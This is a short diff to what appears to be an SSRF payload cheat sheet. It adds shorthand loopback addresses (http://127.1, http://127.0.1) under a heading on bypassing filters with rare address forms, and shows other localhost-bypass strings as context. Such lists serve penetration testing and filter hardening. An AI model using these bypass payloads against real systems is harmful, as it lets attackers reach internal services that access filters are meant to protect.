@@ -136,10 +136,12 @@ localhost:+11211aaa
 localhost:00011211aaaa
 ```
 
-Bypass using rare address
+Bypass using rare address, you can short-hand IP addresses by dropping the zeros
 
 ```powershell
 http://0/
+http://127.1
+http://127.0.1
 ```
 
 Bypass using bash variables (curl only)
